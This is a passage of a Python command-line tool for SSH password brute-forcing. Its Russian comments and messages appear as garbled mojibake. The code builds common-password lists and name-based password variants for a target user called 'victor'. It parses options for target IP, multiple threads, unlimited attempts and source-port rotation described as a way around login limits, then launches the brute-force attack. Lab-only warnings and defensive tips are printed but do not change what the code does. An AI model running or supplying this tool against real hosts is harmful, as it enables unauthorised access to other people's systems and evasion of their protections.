            print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞ –ø–∞—Ä–æ–ª–µ–π: {e}")
            return []
    
    def generate_common_passwords(self):
        """
        –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ø–∏—Å–∫–∞ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–Ω—ã—Ö –ø–∞—Ä–æ–ª–µ–π
        """
        passwords = [
            # –ë–∞–∑–æ–≤—ã–µ –ø–∞—Ä–æ–ª–∏
            'password', '123456', 'admin', 'root', 'kali', 'test', 'hello',
            'password123', 'admin123', 'root123', 'kali123', 'test123',
            'Password', 'Admin', 'Root', 'Kali', 'Test',
            'P@ssw0rd', 'Adm1n', 'R00t', 'K@li', 'T3st',
            
            # –ü–∞—Ä–æ–ª–∏ —Å —Ü–∏—Ñ—Ä–∞–º–∏
            '12345678', 'qwerty', 'abc123', 'password1', 'admin1',
            '123456789', '1234567890', 'password12', 'admin12',
            
            # –ü–∞—Ä–æ–ª–∏ —Å —Å–∏–º–≤–æ–ª–∞–º–∏
            'password!', 'admin!', 'root!', 'kali!', 'test!',
            'password@', 'admin@', 'root@', 'kali@', 'test@',
            'password#', 'admin#', 'root#', 'kali#', 'test#',
            
            # –ö–æ–º–±–∏–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –ø–∞—Ä–æ–ª–∏
            'pass123', 'admin123', 'root123', 'kali123', 'test123',
            '123pass', '123admin', '123root', '123kali', '123test',
            'pass!123', 'admin!123', 'root!123', 'kali!123', 'test!123',
            
            # –ü—É—Å—Ç—ã–µ –∏ –ø—Ä–æ—Å—Ç—ã–µ –ø–∞—Ä–æ–ª–∏
            '', '123', '1234', '12345', '123456', '1234567',
            'a', 'aa', 'aaa', 'aaaa', 'aaaaa',
            '1', '11', '111', '1111', '11111',
        ]
        
        print(f"‚úÖ –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–æ {len(passwords)} —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–Ω—ã—Ö –ø–∞—Ä–æ–ª–µ–π")
        return passwords
    
    def generate_victor_passwords(self):
        """
        –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø–∞—Ä–æ–ª–µ–π –Ω–∞ –æ—Å–Ω–æ–≤–µ –∏–º–µ–Ω–∏ Victor
        """
        base_name = "victor"
        passwords = []
        
        # –ë–∞–∑–æ–≤—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã
        passwords.extend([
            base_name,
            base_name.capitalize(),
            base_name.upper(),
            base_name.lower()
        ])
        
        # –° —Ü–∏—Ñ—Ä–∞–º–∏
        for i in range(10):
            passwords.extend([
                f"{base_name}{i}",
                f"{base_name.capitalize()}{i}",
                f"{base_name.upper()}{i}",
                f"{i}{base_name}",
                f"{i}{base_name.capitalize()}",
                f"{i}{base_name.upper()}"
            ])
        
        # –° —Å–∏–º–≤–æ–ª–∞–º–∏
        symbols = ['!', '@', '#', '$', '%', '^', '&', '*', '+', '=', '-', '_', '.', ',', ';', ':', '?', '/', '|', '\\', '~', '`', '<', '>', '[', ']', '{', '}', '(', ')', '"', "'", ' ']
        for sym in symbols[:10]:  # –ë–µ—Ä–µ–º —Ç–æ–ª—å–∫–æ –ø–µ—Ä–≤—ã–µ 10 —Å–∏–º–≤–æ–ª–æ–≤
            passwords.extend([
                f"{base_name}{sym}",
                f"{base_name.capitalize()}{sym}",
                f"{base_name.upper()}{sym}",
                f"{sym}{base_name}",
                f"{sym}{base_name.capitalize()}",
                f"{sym}{base_name.upper()}"
            ])
        
        # –ö–æ–º–±–∏–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã
        for i in range(5):
            for sym in symbols[:5]:
                passwords.extend([
                    f"{base_name}{i}{sym}",
                    f"{base_name.capitalize()}{i}{sym}",
                    f"{sym}{base_name}{i}",
                    f"{sym}{base_name.capitalize()}{i}"
                ])
        
        # –£–¥–∞–ª—è–µ–º –¥—É–±–ª–∏–∫–∞—Ç—ã
        passwords = list(set(passwords))
        
        print(f"‚úÖ –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–æ {len(passwords)} –ø–∞—Ä–æ–ª–µ–π –Ω–∞ –æ—Å–Ω–æ–≤–µ –∏–º–µ–Ω–∏ Victor")
        return passwords

def main():
    """
    –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–æ–¥–≤–∏–Ω—É—Ç–æ–≥–æ SSH –∞—Ç–∞–∫—É—é—â–µ–≥–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞
    """
    print("=" * 60)
    print("üîê –ü–†–û–î–í–ò–ù–£–¢–´–ô SSH –ê–¢–ê–ö–£–Æ–©–ò–ô –ò–ù–°–¢–†–£–ú–ï–ù–¢")
    print("=" * 60)
    print("‚ö†Ô∏è  –í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–∏–∏!")
    print("‚ö†Ô∏è  –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø—Ä–æ—Ç–∏–≤ —á—É–∂–∏—Ö —Å–∏—Å—Ç–µ–º –ù–ï–ó–ê–ö–û–ù–ù–û!")
    print("=" * 60)
    
    parser = argparse.ArgumentParser(description='–ü—Ä–æ–¥–≤–∏–Ω—É—Ç—ã–π SSH –∞—Ç–∞–∫—É—é—â–∏–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç')
    parser.add_argument('target', help='IP –∞–¥—Ä–µ—Å —Ü–µ–ª–∏')
    parser.add_argument('-u', '--username', default='victor', help='–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH –ø–æ—Ä—Ç')
    parser.add_argument('-w', '--wordlist', help='–§–∞–π–ª —Å–æ —Å–ª–æ–≤–∞—Ä–µ–º –ø–∞—Ä–æ–ª–µ–π')
    parser.add_argument('-t', '--threads', type=int, default=3, help='–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ—Ç–æ–∫–æ–≤')
    parser.add_argument('-m', '--max-attempts', type=int, default=1000, help='–ú–∞–∫—Å–∏–º—É–º –ø–æ–ø—ã—Ç–æ–∫')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout –¥–ª—è SSH —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è')
    parser.add_argument('--delay', type=float, default=0.5, help='–ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏')
    parser.add_argument('--single-thread', action='store_true', help='–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –æ–¥–Ω–æ–ø–æ—Ç–æ—á–Ω—ã–π —Ä–µ–∂–∏–º')
    parser.add_argument('--common-passwords', action='store_true', help='–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–Ω—ã–µ –ø–∞—Ä–æ–ª–∏')
    parser.add_argument('--victor-passwords', action='store_true', help='–ì–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å –ø–∞—Ä–æ–ª–∏ –Ω–∞ –æ—Å–Ω–æ–≤–µ Victor')
    parser.add_argument('--github-passwords', action='store_true', help='–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø–æ–ø—É–ª—è—Ä–Ω—ã–µ –ø–∞—Ä–æ–ª–∏ –∏–∑ GitHub')
    parser.add_argument('--random-ports', action='store_true', help='–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–ª—É—á–∞–π–Ω—ã–µ –ø–æ—Ä—Ç—ã –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è')
    parser.add_argument('--port-count', type=int, default=100, help='–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–ª—É—á–∞–π–Ω—ã—Ö –ø–æ—Ä—Ç–æ–≤ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏')
    parser.add_argument('--unlimited-attempts', action='store_true', help='–ù–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫ (—Ü–∏–∫–ª–∏—á–µ—Å–∫–∏–π –ø–µ—Ä–µ–±–æ—Ä)')
    parser.add_argument('--port-rotation', action='store_true', help='–í–∫–ª—é—á–∏—Ç—å –≤—Ä–∞—â–µ–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤ –¥–ª—è –æ–±—Ö–æ–¥–∞ –ª–∏–º–∏—Ç–æ–≤')
    parser.add_argument('--multi-user', action='store_true', help='–ê—Ç–∞–∫–æ–≤–∞—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ')
    
    args = parser.parse_args()
    
    # –°–æ–∑–¥–∞–µ–º —ç–∫–∑–µ–º–ø–ª—è—Ä –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞
    ssh_attack = AdvancedSSHAttack(args.target, args.port)
    ssh_attack.max_attempts = args.max_attempts
    ssh_attack.timeout = args.timeout
    ssh_attack.delay_between_attempts = args.delay
    
    # –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º —Ä–µ–∂–∏–º—ã
    if args.unlimited_attempts:
        ssh_attack.generate_unlimited_ports()
        print(f"‚ôæÔ∏è  –í–∫–ª—é—á–µ–Ω —Ä–µ–∂–∏–º –Ω–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫")
    
    if args.random_ports or args.port_rotation:
        ssh_attack.generate_source_ports(args.port_count)
        ssh_attack.port_rotation_enabled = args.port_rotation
        print(f"üîÄ –í–∫–ª—é—á–µ–Ω —Ä–µ–∂–∏–º —Å–ª—É—á–∞–π–Ω—ã—Ö –ø–æ—Ä—Ç–æ–≤ ({args.port_count} –ø–æ—Ä—Ç–æ–≤)")
        if args.port_rotation:
            print(f"üîÑ –í–∫–ª—é—á–µ–Ω–æ –≤—Ä–∞—â–µ–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤")
    
    # –ó–∞–≥—Ä—É–∂–∞–µ–º –ø–∞—Ä–æ–ª–∏
    if args.github_passwords:
        passwords = ssh_attack.load_github_passwords()
    elif args.victor_passwords:
        passwords = ssh_attack.generate_victor_passwords()
    elif args.common_passwords:
        passwords = ssh_attack.generate_common_passwords()
    elif args.wordlist:
        passwords = ssh_attack.load_password_list(args.wordlist)
    else:
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫
        passwords = [
            'victor', 'Victor', 'VICTOR', 'victor123', 'Victor123', 'VICTOR123',
            'victor1', 'Victor1', 'VICTOR1', 'victor1234', 'Victor1234', 'VICTOR1234',
            'victor!', 'Victor!', 'VICTOR!', 'victor@', 'Victor@', 'VICTOR@',
            'password', '123456', 'admin', 'root', 'kali', 'test', 'hello',
            'password123', 'admin123', 'root123', 'kali123'
        ]
    
    if not passwords:
        print("‚ùå –ù–µ—Ç –ø–∞—Ä–æ–ª–µ–π –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è")
        return
    
    try:
        # –ó–∞–ø—É—Å–∫–∞–µ–º brute force
        if args.unlimited_attempts:
            success = ssh_attack.brute_force_unlimited(args.username, passwords)
        elif args.single_thread:
            success = ssh_attack.brute_force_single_thread(args.username, passwords)
        else:
            success = ssh_attack.brute_force_multi_thread(args.username, passwords, args.threads)
        
        if success:
            print("\nüéâ –ê–¢–ê–ö–ê –£–°–ü–ï–®–ù–ê!")
            print("üí° –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –∑–∞—â–∏—Ç–µ:")
            print("  ‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Å–∏–ª—å–Ω—ã–µ –ø–∞—Ä–æ–ª–∏")
            print("  ‚Ä¢ –í–∫–ª—é—á–∏—Ç–µ –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω—É—é –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é")
            print("  ‚Ä¢ –ù–∞—Å—Ç—Ä–æ–π—Ç–µ fail2ban –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ IP")
            print("  ‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ SSH –∫–ª—é—á–∏ –≤–º–µ—Å—Ç–æ –ø–∞—Ä–æ–ª–µ–π")
            print("  ‚Ä¢ –û–≥—Ä–∞–Ω–∏—á—å—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫ –≤—Ö–æ–¥–∞")
        else:
            print("\n‚ùå –ê–¢–ê–ö–ê –ù–ï–£–°–ü–ï–®–ù–ê")
            print("‚úÖ –°–∏—Å—Ç–µ–º–∞ –∑–∞—â–∏—â–µ–Ω–∞ –æ—Ç brute force –∞—Ç–∞–∫")
            
    except KeyboardInterrupt:
        print("\nüõë –ê—Ç–∞–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
    
    print("\nüìö –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:")
    print("‚Ä¢ SSH brute force - –ø–µ—Ä–µ–±–æ—Ä –ø–∞—Ä–æ–ª–µ–π –¥–ª—è SSH")
    print("‚Ä¢ –ú–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω–æ—Å—Ç—å —É—Å–∫–æ—Ä—è–µ—Ç –∞—Ç–∞–∫—É")
    print("‚Ä¢ –°–ª–∞–±—ã–µ –ø–∞—Ä–æ–ª–∏ –ª–µ–≥–∫–æ –≤–∑–ª–∞–º—ã–≤–∞—é—Ç—Å—è")
    print("‚Ä¢ –ó–∞—â–∏—Ç–∞: —Å–∏–ª—å–Ω—ã–µ –ø–∞—Ä–æ–ª–∏ + fail2ban + 2FA")

if __name__ == "__main__":
    main()
